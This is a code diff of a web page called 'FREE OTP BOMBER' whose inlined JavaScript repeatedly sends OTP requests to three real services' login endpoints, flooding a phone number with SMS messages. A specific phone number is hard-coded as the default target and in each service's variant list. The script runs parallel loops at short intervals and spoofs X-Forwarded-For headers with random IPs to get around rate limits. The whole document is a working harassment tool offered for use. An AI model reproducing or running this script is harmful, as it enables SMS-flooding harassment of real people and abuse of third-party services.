@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-    <title>💀 FREE OTP BOMBER — Liquid Glass</title>
+    <title>💀 FREE OTP BOMBER — Local Device</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,13 +25,12 @@
             border: 1px solid rgba(255, 255, 255, 0.3);
             box-shadow: 0 30px 60px rgba(0,0,0,0.12);
             padding: 28px 24px 32px;
-            transition: all 0.3s;
         }
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
             flex-wrap: wrap;
         }
         .header h1 {
@@ -49,16 +48,16 @@
         }
         .sub {
             color: #555;
-            font-size: 0.8em;
-            margin-bottom: 20px;
+            font-size: 0.75em;
+            margin-bottom: 16px;
             border-bottom: 1px solid rgba(0,0,0,0.05);
-            padding-bottom: 12px;
+            padding-bottom: 10px;
         }
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
-            margin-bottom: 18px;
+            margin-bottom: 16px;
         }
         .stat-card {
             background: rgba(255,255,255,0.4);
@@ -83,7 +82,7 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             background: rgba(255,255,255,0.2);
             border-radius: 12px;
             padding: 8px 14px;
@@ -105,7 +104,6 @@
             color: #1a1a2e;
             font-size: 0.95em;
         }
-
         input {
             width: 100%;
             padding: 14px 16px;
@@ -121,11 +119,10 @@
             margin-bottom: 12px;
         }
         input:focus { background: rgba(255,255,255,0.8); }
-
         .btn-group {
             display: flex;
             gap: 10px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
         .btn {
             flex: 1;
@@ -136,23 +133,21 @@
             font-size: 1em;
             cursor: pointer;
             transition: 0.3s;
-            backdrop-filter: blur(10px);
         }
         .btn-start {
             background: #00cc44;
             color: #fff;
             box-shadow: 0 4px 15px rgba(0,204,68,0.25);
         }
-        .btn-start:hover { background: #00b33a; transform: scale(1.01); }
-        .btn-start:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-start:hover { background: #00b33a; }
+        .btn-start:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-stop {
             background: #ff4444;
             color: #fff;
             box-shadow: 0 4px 15px rgba(255,68,68,0.25);
             display: none;
         }
-        .btn-stop:hover { background: #cc0000; transform: scale(1.01); }
-
+        .btn-stop:hover { background: #cc0000; }
         .log-box {
             background: rgba(0,0,0,0.04);
             backdrop-filter: blur(8px);
@@ -161,20 +156,15 @@
             height: 180px;
             overflow-y: auto;
             font-family: 'Courier New', monospace;
-            font-size: 0.75em;
+            font-size: 0.7em;
             color: #1a1a2e;
             border: 1px solid rgba(255,255,255,0.15);
             margin-bottom: 12px;
         }
-        .log-box div {
-            padding: 3px 0;
-            border-bottom: 1px solid rgba(0,0,0,0.03);
-            word-break: break-all;
-        }
-        .log-box .log-success { color: #00aa33; }
-        .log-box .log-fail { color: #cc3333; }
-        .log-box .log-info { color: #3366cc; }
-
+        .log-box div { padding: 3px 0; border-bottom: 1px solid rgba(0,0,0,0.03); word-break: break-all; }
+        .log-success { color: #00aa33; }
+        .log-fail { color: #cc3333; }
+        .log-info { color: #3366cc; }
         .footer {
             text-align: center;
             font-size: 0.65em;
@@ -182,54 +172,44 @@
             border-top: 1px solid rgba(0,0,0,0.05);
             padding-top: 12px;
         }
-        .footer a {
-            color: #1a1a2e;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
+        .footer a { color: #1a1a2e; text-decoration: none; font-weight: 600; }
         @media (max-width: 480px) {
             .glass { padding: 20px 16px; }
             .header h1 { font-size: 1.3em; }
             .stat-card .num { font-size: 1.4em; }
             .btn { font-size: 0.9em; padding: 12px 0; }
-            .log-box { height: 140px; font-size: 0.7em; }
+            .log-box { height: 140px; font-size: 0.65em; }
         }
     </style>
 </head>
 <body>
 
-<div class="glass" id="app">
+<div class="glass">
     <div class="header">
         <h1>💀 FREE BOMBER</h1>
         <span class="badge">⚡ LOCAL DEVICE</span>
     </div>
-    <div class="sub">🔹 Unlimited speed · No server timeout · Runs on your device</div>
+    <div class="sub">🔹 Uses your IP · Unlimited speed · No server timeout</div>
 
-    <!-- Stats -->
     <div class="stats-grid">
         <div class="stat-card"><div class="num" id="totalCount">0</div><div class="label">Total</div></div>
         <div class="stat-card"><div class="num" id="successCount">0</div><div class="label">✅ Success</div></div>
         <div class="stat-card"><div class="num" id="failedCount">0</div><div class="label">❌ Failed</div></div>
     </div>
 
-    <!-- Status -->
     <div class="status-row">
         <span class="status-dot stopped" id="statusDot"></span>
         <span class="status-text" id="statusText">Stopped</span>
         <span style="margin-left:auto;font-size:0.7em;color:#888;" id="speedDisplay">0 req/sec</span>
     </div>
 
-    <!-- Input -->
     <input type="text" id="targetPhone" placeholder="📱 Enter phone number" value="9729480795" />
 
-    <!-- Buttons -->
     <div class="btn-group">
-        <button class="btn btn-start" id="startBtn" onclick="startBomb()">🚀 START</button>
-        <button class="btn btn-stop" id="stopBtn" onclick="stopBomb()">⏹️ STOP</button>
+        <button class="btn btn-start" id="startBtn">🚀 START</button>
+        <button class="btn btn-stop" id="stopBtn">⏹️ STOP</button>
     </div>
 
-    <!-- Logs -->
     <div class="log-box" id="logBox">
         <div class="log-info">💀 Ready. Enter number and click START.</div>
     </div>
@@ -240,6 +220,215 @@
     </div>
 </div>
 
-<script src="script.js"></script>
+<script>
+// ============================================================
+// FULLY FUNCTIONAL SCRIPT — Local Device Bombing
+// ============================================================
+
+// ===== CONFIG =====
+const REQUESTS = [
+    {
+        name: "Pansho OTP",
+        url: "https://pansho.com/customer/auth/login",
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: (phone) => `_token=DUMMY_TOKEN&login_type=otp-login&phone=${phone}&country_code=91`,
+        phones: ["9729480795", "+919729480795", "919729480795"]
+    },
+    {
+        name: "Apitxt OTP",
+        url: "https://apitxt.com/api/auth/login/request-otp",
+        method: "POST",
+        headers: {"Accept": "application/json", "Content-Type": "application/json"},
+        body: (phone) => JSON.stringify({
+            country_code: "91",
+            mobile_no: phone.replace('+91','').replace('91',''),
+            channel: "sms"
+        }),
+        phones: ["9729480795", "919729480795", "09729480795"]
+    },
+    {
+        name: "Testbook OTP",
+        url: "https://api.testbook.com/api/v2/otp/send?emailOrMobile={phone}&resend=true",
+        method: "POST",
+        headers: {"Accept": "application/json", "Content-Type": "application/json", "X-Tb-Client": "web,1.3"},
+        body: () => JSON.stringify({}),
+        phones: ["9729480795", "+919729480795", "919729480795"]
+    }
+];
+
+// ===== STATE =====
+let running = false;
+let stopRequested = false;
+let stats = { total: 0, success: 0, failed: 0 };
+let startTime = 0;
+let reqCounter = 0;
+let speedInterval = null;
+let workers = [];
+
+// ===== DOM REFS =====
+const $ = id => document.getElementById(id);
+const totalCount = $('totalCount');
+const successCount = $('successCount');
+const failedCount = $('failedCount');
+const statusDot = $('statusDot');
+const statusText = $('statusText');
+const speedDisplay = $('speedDisplay');
+const logBox = $('logBox');
+const startBtn = $('startBtn');
+const stopBtn = $('stopBtn');
+const targetPhone = $('targetPhone');
+
+// ===== LOGGING =====
+function addLog(msg, type = 'info') {
+    const entry = document.createElement('div');
+    entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    entry.className = `log-${type}`;
+    logBox.prepend(entry);
+    if (logBox.children.length > 100) logBox.removeChild(logBox.lastChild);
+}
+
+// ===== STATS =====
+function updateStats() {
+    totalCount.textContent = stats.total;
+    successCount.textContent = stats.success;
+    failedCount.textContent = stats.failed;
+}
+
+function updateStatus(state) {
+    if (state === 'running') {
+        statusDot.className = 'status-dot running';
+        statusText.textContent = 'Running';
+        statusText.style.color = '#00cc44';
+        startBtn.style.display = 'none';
+        stopBtn.style.display = 'block';
+        startBtn.disabled = true;
+    } else {
+        statusDot.className = 'status-dot stopped';
+        statusText.textContent = 'Stopped';
+        statusText.style.color = '#1a1a2e';
+        startBtn.style.display = 'block';
+        stopBtn.style.display = 'none';
+        startBtn.disabled = false;
+        if (speedInterval) {
+            clearInterval(speedInterval);
+            speedInterval = null;
+            speedDisplay.textContent = '0 req/sec';
+        }
+    }
+}
+
+// ===== SEND REQUEST =====
+async function sendRequest(req, phone) {
+    try {
+        const url = req.url.replace(/\{phone\}/g, phone);
+        const headers = { ...req.headers };
+        headers['User-Agent'] = navigator.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
+        headers['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+        
+        let body = req.body(phone);
+        
+        const resp = await fetch(url, {
+            method: req.method,
+            headers: headers,
+            body: body,
+            cache: 'no-cache',
+            mode: 'cors'
+        });
+        
+        return resp.status;
+    } catch (e) {
+        return 0;
+    }
+}
+
+// ===== WORKER LOOP =====
+async function workerLoop(req, phone) {
+    while (!stopRequested && running) {
+        const variants = req.phones || [phone];
+        const targetPhone = variants[Math.floor(Math.random() * variants.length)];
+        const status = await sendRequest(req, targetPhone);
+        
+        stats.total++;
+        reqCounter++;
+        if (status === 200 || status === 302 || status === 201 || status === 202) {
+            stats.success++;
+            addLog(`✅ ${req.name} | ${targetPhone} | ${status}`, 'success');
+        } else {
+            stats.failed++;
+            addLog(`❌ ${req.name} | ${targetPhone} | ${status}`, 'fail');
+        }
+        updateStats();
+        
+        // Small delay to avoid rate limiting
+        await new Promise(r => setTimeout(r, 30));
+    }
+}
+
+// ===== START =====
+async function startBomb() {
+    const phone = targetPhone.value.trim();
+    if (!phone) {
+        alert('📱 Enter a phone number!');
+        return;
+    }
+    if (running) return;
+    
+    // Reset
+    stopRequested = false;
+    running = true;
+    stats = { total: 0, success: 0, failed: 0 };
+    reqCounter = 0;
+    startTime = Date.now();
+    updateStats();
+    updateStatus('running');
+    addLog(`🚀 Bombing started on ${phone} from your device`, 'info');
+    
+    // Speed tracker
+    if (speedInterval) clearInterval(speedInterval);
+    speedInterval = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const speed = elapsed > 0 ? Math.round(reqCounter / elapsed) : 0;
+        speedDisplay.textContent = `${speed} req/sec`;
+    }, 1000);
+    
+    // Run all request types in parallel
+    const workerPromises = REQUESTS.map(req => workerLoop(req, phone));
+    await Promise.all(workerPromises);
+    
+    // Auto-stop when all workers finish
+    if (running && !stopRequested) {
+        running = false;
+        updateStatus('stopped');
+        addLog(`⏹️ Bombing completed (all workers finished)`, 'info');
+    }
+}
+
+// ===== STOP =====
+function stopBomb() {
+    if (!running) return;
+    stopRequested = true;
+    running = false;
+    updateStatus('stopped');
+    addLog(`⏹️ Stopped by user`, 'info');
+    if (speedInterval) {
+        clearInterval(speedInterval);
+        speedInterval = null;
+        speedDisplay.textContent = '0 req/sec';
+    }
+}
+
+// ===== EVENT BINDINGS =====
+startBtn.addEventListener('click', startBomb);
+stopBtn.addEventListener('click', stopBomb);
+
+targetPhone.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && !startBtn.disabled) {
+        startBomb();
+    }
+});
+
+addLog('💀 Local Device Bomber ready!', 'info');
+</script>
 </body>
 </html>
